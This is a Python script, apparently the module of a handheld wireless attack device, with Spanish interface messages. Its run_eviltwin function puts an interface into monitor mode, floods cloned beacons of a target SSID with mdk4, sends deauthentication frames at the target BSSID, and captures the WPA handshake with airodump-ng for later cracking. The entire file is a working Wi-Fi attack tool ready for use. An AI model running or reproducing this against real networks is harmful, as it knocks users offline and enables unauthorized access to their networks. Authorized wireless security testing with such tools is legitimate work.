import subprocess
import time
import os
import signal
import sys
from display.screen import MenuDisplay

IFACE = "mon0"
MON_UP_CMD = ["sudo", "mon0up"]
MON_DOWN_CMD = ["sudo", "mon0down"]

_child_procs = []
_interrupted = False
_brought_up_by_script = False


# ------------------ UTILIDADES ------------------

def _run_mon_cmd(cmd, timeout=4.0):
    try:
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return p.returncode, (p.stdout or ""), (p.stderr or "")
    except Exception as e:
        return -1, "", str(e)


def _iface_exists():
    return os.path.isdir(f"/sys/class/net/{IFACE}")


def _iface_is_up():
    try:
        res = subprocess.run(["ip", "-o", "link", "show", IFACE],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if res.returncode != 0:
            return False
        out = res.stdout.lower()
        return ("state up" in out) or ("<up" in out)
    except Exception:
        return False


def bring_mon0_up():
    global _brought_up_by_script

    if _iface_is_up():
        return True

    rc, out, err = _run_mon_cmd(MON_UP_CMD)
    time.sleep(0.5)

    for _ in range(10):
        if _iface_exists() or _iface_is_up():
            _brought_up_by_script = True
            return True
        time.sleep(0.3)

    return False


def bring_mon0_down():
    if not _brought_up_by_script:
        return True

    _run_mon_cmd(MON_DOWN_CMD)
    time.sleep(0.5)
    return not (_iface_exists() or _iface_is_up())


def _terminate_child_procs():
    for p in list(_child_procs):
        try:
            if p.poll() is None:
                try:
                    p.terminate()
                    p.wait(timeout=3)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
        except Exception:
            pass
    _child_procs.clear()


def _signal_handler(signum, frame):
    global _interrupted
    _interrupted = True
    _terminate_child_procs()
    bring_mon0_down()


signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


# ------------------ MAIN ------------------

def run_eviltwin(ssid, bssid, channel):
    global _interrupted

    display = MenuDisplay()
    timestamp = time.strftime("%Y%m%d_%H%M%S")

    folder = "/opt/beetle/reports/wifi"
    os.makedirs(folder, exist_ok=True)

    ssidlist_path = f"/tmp/mdk4_{timestamp}.txt"

    with open(ssidlist_path, "w") as f:
        for _ in range(30):
            f.write(ssid + "\n")

    cap_prefix = os.path.join(folder, f"handshake_{ssid}_{timestamp}")
    cap_file = f"{cap_prefix}-01.cap"

    display.show_message(["   Enviando Clones...  ", "   Con MDK4...   "], center=True)
    time.sleep(1)

    if not bring_mon0_up():
        display.show_message(["Error", "mon0"], center=True)
        time.sleep(2)
        return None

    try:
        # --- AIRODUMP ---
        airodump_cmd = [
            "sudo", "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", cap_prefix,
            IFACE
        ]

        airodump_proc = subprocess.Popen(airodump_cmd,
                                         stdout=subprocess.DEVNULL,
                                         stderr=subprocess.DEVNULL)
        _child_procs.append(airodump_proc)

        time.sleep(3)

        # --- MDK4 BEACON ---
        mdk4_b = subprocess.Popen(
            ["sudo", "mdk4", IFACE, "b", "-f", ssidlist_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        _child_procs.append(mdk4_b)

        # --- MDK4 DEAUTH ---
        mdk4_d = subprocess.Popen(
            ["sudo", "mdk4", IFACE, "d", "-c", str(channel), "-B", bssid],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        _child_procs.append(mdk4_d)

        display.show_message(["   Atacando...   ", ssid], center=True)

        start = time.time()
        duration = 30

        while time.time() - start < duration:
            if _interrupted:
                break
            time.sleep(1)

        time.sleep(8)

    except Exception:
        display.show_message(["Error ejecución"], center=True)
        time.sleep(2)

    finally:
        _terminate_child_procs()

        try:
            os.remove(ssidlist_path)
        except Exception:
            pass

        bring_mon0_down()

    # -------- RESULTADO --------

    if os.path.exists(cap_file):
        display.show_message(["   Handshake Capturado   "], center=True)
        time.sleep(1)
        return cap_file
    else:
        display.show_message(["   Sin handshake   "], center=True)
        time.sleep(1)
        return None


if __name__ == "__main__":
    print("Importar y usar run_eviltwin()")
